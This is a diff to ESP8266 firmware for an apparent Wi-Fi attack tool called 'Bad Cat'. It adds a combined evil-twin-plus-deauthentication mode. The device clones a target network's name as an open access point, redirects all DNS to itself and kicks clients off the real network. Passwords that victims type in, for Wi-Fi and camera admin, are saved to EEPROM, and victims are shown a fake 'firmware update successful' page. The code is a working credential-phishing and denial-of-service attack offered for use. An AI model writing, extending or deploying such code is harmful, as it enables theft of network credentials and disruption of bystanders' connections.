@@ -372,35 +372,35 @@ void handleResult() {
       _correct += " | Cam Admin: " + _tryCamPassword;
     }
     
-    // Save to EEPROM so it survives reboots
+    // Send to EEPROM so it survives reboots
     for (int i = 0; i < _correct.length() && i < 255; i++) {
       EEPROM.write(i, _correct[i]);
     }
     EEPROM.write(_correct.length(), 0);
     EEPROM.commit();
     
-    hotspot_active = false;
-    dnsServer.stop();
-    WiFi.disconnect(); // Disconnect cleanly from target
-    delay(100);
-    WiFi.softAPdisconnect (true);
-    delay(100);
-    WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
-    WiFi.softAP("BadCat", "Cat@1234");
-    dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
     Serial.println("Good password was entered !");
     Serial.println(_correct);
+    
+    webServer.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = 'http://192.168.4.1/admin';}, 8000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'><style>body{background:#f2f2f2;color:#333;font-family:Century Gothic, sans-serif;text-align:center;padding-top:15%;} .box{background:#fff; border:1px solid #ccc; border-radius:5px; padding:20px; max-width:400px; margin:auto; box-shadow:0 0 10px rgba(0,0,0,0.1);}</style></head><body><div class='box'><h2 style='color:#0066ff;'>Update Successful</h2><p>The firmware update is complete and the network has been restored.</p><hr style='border:0; border-top:1px solid #eee; margin:15px 0;'><p style='font-size:14px; color:#666;'>To access the control panel again, reconnect your Wi-Fi to <b>BadCat</b> and visit <b>192.168.4.1/admin</b></p></div></body> </html>");
+    webServer.client().flush();
+    delay(1000);
+    
+    ESP.restart();
   }
 }
 
 const char _tempHTML[] PROGMEM = "<!DOCTYPE html><html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>\n"
-"<style>:root{--bg:#050510;--panel-bg:rgba(10,15,30,0.85);--border:#00e5ff;--text:#e0f7fa;--accent:#00e5ff;--accent-hover:#00b3cc;--red:#ff0055;--green:#00ff88;--glow-cyan:0 0 5px rgba(0,229,255,0.4),0 0 10px rgba(0,229,255,0.2);--glow-red:0 0 5px rgba(255,0,85,0.4),0 0 10px rgba(255,0,85,0.2);--glow-green:0 0 5px rgba(0,255,136,0.4),0 0 10px rgba(0,255,136,0.2)}*{box-sizing:border-box}body{background-color:var(--bg);background-image:linear-gradient(0deg,transparent 24%,rgba(0,229,255,0.05) 25%,rgba(0,229,255,0.05) 26%,transparent 27%,transparent 74%,rgba(0,229,255,0.05) 75%,rgba(0,229,255,0.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(0,229,255,0.05) 25%,rgba(0,229,255,0.05) 26%,transparent 27%,transparent 74%,rgba(0,229,255,0.05) 75%,rgba(0,229,255,0.05) 76%,transparent 77%,transparent);background-size:40px 40px;color:var(--text);font-family:'Courier New',Courier,monospace;margin:0;padding:20px;line-height:1.6}.content{max-width:800px;margin:auto}h2{text-align:center;font-size:26px;margin-bottom:30px;font-weight:bold;color:var(--accent);text-transform:uppercase;letter-spacing:2px;text-shadow:var(--glow-cyan)}h2 svg{width:32px;height:32px;fill:var(--accent);filter:drop-shadow(0 0 4px var(--accent)) drop-shadow(0 0 8px var(--accent));vertical-align:middle;margin-bottom:4px;margin-right:8px}.panel{background:var(--panel-bg);padding:20px;border-radius:4px;border:1px solid var(--accent);margin-bottom:25px;box-shadow:0 0 10px rgba(0,229,255,0.2);backdrop-filter:blur(5px);position:relative}.panel::before,.panel::after{content:'';position:absolute;width:15px;height:15px;border:2px solid var(--accent);pointer-events:none}.panel::before{top:-2px;left:-2px;border-right:none;border-bottom:none}.panel::after{bottom:-2px;right:-2px;border-left:none;border-top:none}h3{margin-top:0;color:var(--accent);font-size:16px;border-bottom:1px dashed var(--accent);padding-bottom:8px;margin-bottom:20px;text-transform:uppercase;letter-spacing:1px}h3 svg{width:18px;height:18px;fill:var(--accent);filter:drop-shadow(0 0 3px var(--accent)) drop-shadow(0 0 6px var(--accent));vertical-align:middle;margin-bottom:4px;margin-right:6px}.table-wrap{overflow-x:auto}table{width:100%;border-collapse:collapse;margin-top:5px;white-space:nowrap}th,td{border-bottom:1px dashed rgba(0,229,255,0.3);padding:12px 15px;text-align:left;font-size:14px}th{background-color:rgba(0,229,255,0.05);font-weight:bold;color:var(--accent);text-transform:uppercase;letter-spacing:1px}tr:hover td{background:rgba(0,229,255,0.1)}button{background-color:transparent;color:var(--accent);border:1px solid var(--accent);box-shadow:0 0 8px rgba(0,229,255,0.2) inset;padding:10px 12px;border-radius:2px;cursor:pointer;transition:all 0.3s ease;font-weight:bold;font-size:14px;font-family:inherit;text-transform:uppercase;letter-spacing:1px;display:flex;align-items:center;justify-content:center;gap:8px;width:100%}button svg{width:14px;height:14px;fill:currentColor;flex-shrink:0}button:hover{background-color:var(--accent);color:#000;box-shadow:var(--glow-cyan);transform:translateY(-1px)}button:active{transform:translateY(0)}button.red{color:var(--red);border-color:var(--red);box-shadow:0 0 8px rgba(255,0,85,0.2) inset}button.red:hover{background-color:var(--red);color:#000;box-shadow:var(--glow-red)}button.green{color:var(--green);border-color:var(--green);box-shadow:0 0 8px rgba(0,255,136,0.2) inset}button.green:hover{background-color:var(--green);color:#000;box-shadow:var(--glow-green)}button:disabled{opacity:0.3;cursor:not-allowed;transform:none;background:transparent;color:var(--accent);box-shadow:none}table button{padding:6px 12px;font-size:12px;width:auto}input[type='text'],input[type='password'],select{padding:12px 15px;background:rgba(0,0,0,0.6);border:1px solid var(--accent);color:var(--accent);border-radius:2px;font-size:14px;font-family:inherit;transition:0.3s;width:100%;margin-bottom:15px}input:focus,select:focus{outline:none;box-shadow:var(--glow-cyan);background:rgba(0,229,255,0.05)}label{font-size:13px;color:var(--text);margin-bottom:5px;display:block;text-transform:uppercase}.flex{display:flex;gap:15px;align-items:center;width:100%}.flex form{flex:1;width:100%}.badge{background:rgba(0,229,255,0.1);border:1px solid var(--accent);padding:6px 12px;border-radius:2px;font-size:13px;margin:4px;display:inline-flex;align-items:center}.badge a{color:var(--red);text-decoration:none;font-weight:bold;margin-left:10px;font-size:16px}.badge a:hover{text-shadow:var(--glow-red)}.radio-group label{display:flex;align-items:center;gap:10px;padding:10px 0;cursor:pointer;font-size:14px}.radio-group input[type='radio']{width:16px;height:16px;margin:0;accent-color:var(--accent);cursor:pointer}@media(max-width:600px){body{padding:10px}h2{font-size:20px;line-height:1.4}h2 svg{width:24px;height:24px;display:block;margin:0 auto 10px auto}.panel{padding:15px}.flex{flex-direction:column;gap:10px}input[type='text'],select{margin-bottom:10px}button{font-size:13px}}</style>\n"
+"<style>:root{--bg:#050510;--panel-bg:rgba(10,15,30,0.85);--border:#00e5ff;--text:#e0f7fa;--accent:#00e5ff;--accent-hover:#00b3cc;--red:#ff0055;--green:#00ff88;--glow-cyan:0 0 5px rgba(0,229,255,0.4),0 0 10px rgba(0,229,255,0.2);--glow-red:0 0 5px rgba(255,0,85,0.4),0 0 10px rgba(255,0,85,0.2);--glow-green:0 0 5px rgba(0,255,136,0.4),0 0 10px rgba(0,255,136,0.2)}*{box-sizing:border-box}body{background-color:var(--bg);background-image:linear-gradient(0deg,transparent 24%,rgba(0,229,255,0.05) 25%,rgba(0,229,255,0.05) 26%,transparent 27%,transparent 74%,rgba(0,229,255,0.05) 75%,rgba(0,229,255,0.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(0,229,255,0.05) 25%,rgba(0,229,255,0.05) 26%,transparent 27%,transparent 74%,rgba(0,229,255,0.05) 75%,rgba(0,229,255,0.05) 76%,transparent 77%,transparent);background-size:40px 40px;color:var(--text);font-family:'Courier New',Courier,monospace;margin:0;padding:20px;line-height:1.6}.content{max-width:800px;margin:auto}h2{text-align:center;font-size:26px;margin-bottom:30px;font-weight:bold;color:var(--accent);text-transform:uppercase;letter-spacing:2px;text-shadow:var(--glow-cyan)}h2 svg{width:56px;height:56px;fill:var(--accent);filter:drop-shadow(0 0 2px var(--accent));display:block;margin:0 auto 10px auto}.panel{background:var(--panel-bg);padding:20px;border-radius:4px;border:1px solid var(--accent);margin-bottom:25px;box-shadow:0 0 10px rgba(0,229,255,0.2);backdrop-filter:blur(5px);position:relative}.panel::before,.panel::after{content:'';position:absolute;width:15px;height:15px;border:2px solid var(--accent);pointer-events:none}.panel::before{top:-2px;left:-2px;border-right:none;border-bottom:none}.panel::after{bottom:-2px;right:-2px;border-left:none;border-top:none}h3{margin-top:0;color:var(--accent);font-size:16px;border-bottom:1px dashed var(--accent);padding-bottom:8px;margin-bottom:20px;text-transform:uppercase;letter-spacing:1px}h3 svg{width:18px;height:18px;fill:var(--accent);filter:drop-shadow(0 0 3px var(--accent)) drop-shadow(0 0 6px var(--accent));vertical-align:middle;margin-bottom:4px;margin-right:6px}.table-wrap{overflow-x:auto}table{width:100%;border-collapse:collapse;margin-top:5px;white-space:nowrap}th,td{border-bottom:1px dashed rgba(0,229,255,0.3);padding:12px 15px;text-align:left;font-size:14px}th{background-color:rgba(0,229,255,0.05);font-weight:bold;color:var(--accent);text-transform:uppercase;letter-spacing:1px}tr:hover td{background:rgba(0,229,255,0.1)}button{background-color:transparent;color:var(--accent);border:1px solid var(--accent);box-shadow:0 0 8px rgba(0,229,255,0.2) inset;padding:10px 12px;border-radius:2px;cursor:pointer;transition:all 0.3s ease;font-weight:bold;font-size:14px;font-family:inherit;text-transform:uppercase;letter-spacing:1px;display:flex;align-items:center;justify-content:center;gap:8px;width:100%}button svg{width:14px;height:14px;fill:currentColor;flex-shrink:0}button:hover{background-color:var(--accent);color:#000;box-shadow:var(--glow-cyan);transform:translateY(-1px)}button:active{transform:translateY(0)}button.red{color:var(--red);border-color:var(--red);box-shadow:0 0 8px rgba(255,0,85,0.2) inset}button.red:hover{background-color:var(--red);color:#000;box-shadow:var(--glow-red)}button.green{color:var(--green);border-color:var(--green);box-shadow:0 0 8px rgba(0,255,136,0.2) inset}button.green:hover{background-color:var(--green);color:#000;box-shadow:var(--glow-green)}button:disabled{opacity:0.3;cursor:not-allowed;transform:none;background:transparent;color:var(--accent);box-shadow:none}table button{padding:6px 12px;font-size:12px;width:auto}input[type='text'],input[type='password'],select{padding:12px 15px;background:rgba(0,0,0,0.6);border:1px solid var(--accent);color:var(--accent);border-radius:2px;font-size:14px;font-family:inherit;transition:0.3s;width:100%;margin-bottom:15px}input:focus,select:focus{outline:none;box-shadow:var(--glow-cyan);background:rgba(0,229,255,0.05)}label{font-size:13px;color:var(--text);margin-bottom:5px;display:block;text-transform:uppercase}.flex{display:flex;gap:15px;align-items:center;width:100%}.flex form{flex:1;width:100%}.badge{background:rgba(0,229,255,0.1);border:1px solid var(--accent);padding:6px 12px;border-radius:2px;font-size:13px;margin:4px;display:inline-flex;align-items:center}.badge a{color:var(--red);text-decoration:none;font-weight:bold;margin-left:10px;font-size:16px}.badge a:hover{text-shadow:var(--glow-red)}.radio-group label{display:flex;align-items:center;gap:10px;padding:10px 0;cursor:pointer;font-size:14px}.radio-group input[type='radio']{width:16px;height:16px;margin:0;accent-color:var(--accent);cursor:pointer}@media(max-width:600px){body{padding:10px}h2{font-size:20px;line-height:1.4}h2 svg{width:36px;height:36px;display:block;margin:0 auto 10px auto}.panel{padding:15px}.flex{flex-direction:column;gap:10px}input[type='text'],select{margin-bottom:10px}button{font-size:13px}}</style>\n"
 "</head><body><div class='content'>\n"
-"<h2><svg viewBox='0 0 24 24' style='width:36px; height:36px; fill:none; stroke:var(--accent); stroke-width:1.5; stroke-linecap:round; stroke-linejoin:round; filter:drop-shadow(0 0 6px var(--accent)); vertical-align:middle; margin-right:10px; margin-bottom:5px;'><path d='M21.5 6.5l-3-2v-2h-3l-2.5 2.5-2.5-2.5h-3v2l-3 2v6c0 4 3.5 7.5 7.5 7.5s7.5-3.5 7.5-7.5v-6z'/><path d='M9 11v.01'/><path d='M15 11v.01'/><path d='M11 15h2'/><path d='M3 13h2'/><path d='M19 13h2'/></svg>BAD CAT CONTROL PANEL</h2>\n"
+"<h2><svg viewBox='0 0 121.6 121.6'><path d='M30,108.785c9,4.601,19.1,7,29.2,7.2c0.5,0,1.1,0,1.6,0c10.2,0,20.3-2.2,29.5-6.6c8.399-4,16-10,21.601-17.5 c6.399-8.601,9.699-18.9,9.699-29.601c0-6.8,0-13.5,0-20.3c0-7.4,0-14.7,0-22.1c0-2.6,0-5.2,0-7.7c0-4.7-4.699-7.8-9-6.1l-22.8,9.5 c-1.5,0.6-3.2,0.7-4.7,0.1c-7.4-2.9-15.6-4.4-24.3-4.4s-16.9,1.6-24.3,4.4c-1.5,0.6-3.2,0.5-4.7-0.1L9,6.385c-4.3-1.8-9,1.4-9,6.1 c0,3.5,0,7.1,0,10.6c0,7.3,0,14.6,0,22c0,6.2,0,12.3,0,18.5c0,9.9,3.2,19.5,8.9,27.5C14.3,98.585,21.7,104.585,30,108.785z M83,62.485c5.5,0,10,4.5,10,10s-4.5,10-10,10s-10-4.5-10-10C73,66.886,77.5,62.485,83,62.485z M38.6,62.485c5.5,0,10,4.5,10,10 s-4.5,10-10,10s-10-4.5-10-10C28.6,66.886,33.1,62.485,38.6,62.485z'/></svg>BAD CAT CONTROL PANEL</h2>\n"
 "<div class='panel'><h3><svg viewBox='0 0 24 24'><path d='M22.7 19l-9.1-9.1c.9-2.3.4-5-1.5-6.9-2-2-5-2.4-7.4-1.1L9 6 6 9 1.6 4.7C.4 7.1.9 10.1 2.9 12.1c1.9 1.9 4.6 2.4 6.9 1.5l9.1 9.1c.4.4 1 .4 1.4 0l2.3-2.3c.5-.4.5-1.1.1-1.4z'/></svg>OFFENSIVE ACTIONS</h3>\n"
 "<div class='flex'>\n"
 "<form method='post' action='/?deauth={deauth}'><button {disabled} class='{deauth_class}'><svg viewBox='0 0 24 24'><path d='M8 5v14l11-7z'/></svg>{deauth_button}</button></form>\n"
 "<form method='post' action='/?hotspot={hotspot}'><button {disabled} class='{hotspot_class}'><svg viewBox='0 0 24 24'><path d='M8 5v14l11-7z'/></svg>{hotspot_button}</button></form>\n"
+"</div>\n"
+"<div class='flex' style='margin-top:15px;'>\n"
+"<form method='post' action='/?eviltwindeauth={eviltwindeauth}'><button {disabled} class='{eviltwindeauth_class}'><svg viewBox='0 0 24 24'><path d='M8 5v14l11-7z'/></svg>{eviltwindeauth_button}</button></form>\n"
 "</div>\n"
 "<div class='flex' style='margin-top:15px;'>\n"
 "<form method='post' action='/?randbeacon={randbeacon}'><button class='{rand_class}'><svg viewBox='0 0 24 24'><path d='M8 5v14l11-7z'/></svg>{rand_button}</button></form>\n"
@@ -415,7 +415,7 @@ void sendNeonMessage(String title, String message, int refreshDelay, String refr
     html += "<meta http-equiv='refresh' content='" + String(refreshDelay) + ";url=" + refreshUrl + "'>";
   }
   html += "<style>:root{--bg:#050510;--accent:#00e5ff;--glow-cyan:0 0 5px rgba(0,229,255,0.4),0 0 10px rgba(0,229,255,0.2);--text:#e0f7fa;} body{background-color:var(--bg);color:var(--text);font-family:'Courier New',Courier,monospace;text-align:center;padding-top:20%;margin:0;padding-left:20px;padding-right:20px;} h2{font-size:26px;color:var(--accent);text-transform:uppercase;letter-spacing:2px;text-shadow:var(--glow-cyan);margin-bottom:20px;} p{font-size:16px;color:#777;} b{color:var(--text);}</style></head><body>";
-  html += "<h2><svg viewBox='0 0 24 24' style='width:40px; height:40px; fill:none; stroke:var(--accent); stroke-width:1.5; stroke-linecap:round; stroke-linejoin:round; filter:drop-shadow(0 0 6px var(--accent)); vertical-align:middle; margin-bottom:10px; display:block; margin: 0 auto 10px auto;'><path d='M21.5 6.5l-3-2v-2h-3l-2.5 2.5-2.5-2.5h-3v2l-3 2v6c0 4 3.5 7.5 7.5 7.5s7.5-3.5 7.5-7.5v-6z'/><path d='M9 11v.01'/><path d='M15 11v.01'/><path d='M11 15h2'/><path d='M3 13h2'/><path d='M19 13h2'/></svg>" + title + "</h2><p>Bad Cat Says: <i>\"" + message + "\"</i></p>";
+  html += "<h2><svg viewBox='0 0 121.6 121.6' style='width:64px; height:64px; fill:var(--accent); filter:drop-shadow(0 0 2px var(--accent)); display:block; margin: 0 auto 10px auto;'><path d='M30,108.785c9,4.601,19.1,7,29.2,7.2c0.5,0,1.1,0,1.6,0c10.2,0,20.3-2.2,29.5-6.6c8.399-4,16-10,21.601-17.5 c6.399-8.601,9.699-18.9,9.699-29.601c0-6.8,0-13.5,0-20.3c0-7.4,0-14.7,0-22.1c0-2.6,0-5.2,0-7.7c0-4.7-4.699-7.8-9-6.1l-22.8,9.5 c-1.5,0.6-3.2,0.7-4.7,0.1c-7.4-2.9-15.6-4.4-24.3-4.4s-16.9,1.6-24.3,4.4c-1.5,0.6-3.2,0.5-4.7-0.1L9,6.385c-4.3-1.8-9,1.4-9,6.1 c0,3.5,0,7.1,0,10.6c0,7.3,0,14.6,0,22c0,6.2,0,12.3,0,18.5c0,9.9,3.2,19.5,8.9,27.5C14.3,98.585,21.7,104.585,30,108.785z M83,62.485c5.5,0,10,4.5,10,10s-4.5,10-10,10s-10-4.5-10-10C73,66.886,77.5,62.485,83,62.485z M38.6,62.485c5.5,0,10,4.5,10,10 s-4.5,10-10,10s-10-4.5-10-10C28.6,66.886,33.1,62.485,38.6,62.485z'/></svg>" + title + "</h2><p>Bad Cat Says: <i>\"" + message + "\"</i></p>";
   html += "</body></html>";
   webServer.send(200, "text/html", html);
 }
@@ -520,14 +520,49 @@ void handleArgs() {
       unsigned long wait_start = millis();
       while (millis() - wait_start < 500) { webServer.client().flush(); delay(1); }
       
+      WiFi.disconnect();
+      delay(100);
       WiFi.softAPdisconnect (true);
+      delay(100);
       WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
       WiFi.softAP("BadCat", "Cat@1234");
       dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
+      return;
+    }
+  }
+
+  if (webServer.hasArg("eviltwindeauth")) {
+    if (webServer.arg("eviltwindeauth") == "start") {
+      hotspot_active = true;
+      deauthing_active = true;
+      dnsServer.stop();
+      sendNeonMessage("STARTING BOTH", "Hiss! Cloning and kicking victims...", 4);
+      unsigned long wait_start = millis();
+      while (millis() - wait_start < 500) { webServer.client().flush(); delay(1); }
       
-      wifi_promiscuous_enable(0);
-      wifi_set_promiscuous_rx_cb(sniffer_callback);
-      wifi_promiscuous_enable(1);
+      WiFi.disconnect();
+      delay(100);
+      WiFi.softAPdisconnect (true);
+      delay(100);
+      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
+      WiFi.softAP(_selectedNetwork.ssid.c_str());
+      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
+      return;
+    } else if (webServer.arg("eviltwindeauth") == "stop") {
+      hotspot_active = false;
+      deauthing_active = false;
+      dnsServer.stop();
+      sendNeonMessage("STOPPING BOTH", "Purr... Network reverted.", 4);
+      unsigned long wait_start = millis();
+      while (millis() - wait_start < 500) { webServer.client().flush(); delay(1); }
+      
+      WiFi.disconnect();
+      delay(100);
+      WiFi.softAPdisconnect (true);
+      delay(100);
+      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
+      WiFi.softAP("BadCat", "Cat@1234");
+      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
       return;
     }
   }
@@ -753,6 +788,16 @@ String buildAdminPage() {
       _html.replace("{hotspot_button}", "START EVILTWIN");
       _html.replace("{hotspot}", "start");
       _html.replace("{hotspot_class}", "green");
+    }
+
+    if (hotspot_active && deauthing_active) {
+      _html.replace("{eviltwindeauth_button}", "STOP BOTH");
+      _html.replace("{eviltwindeauth}", "stop");
+      _html.replace("{eviltwindeauth_class}", "red");
+    } else {
+      _html.replace("{eviltwindeauth_button}", "EVIL TWIN + DEAUTH");
+      _html.replace("{eviltwindeauth}", "start");
+      _html.replace("{eviltwindeauth_class}", "green");
     }
 
     if (_selectedNetwork.ssid == "") {
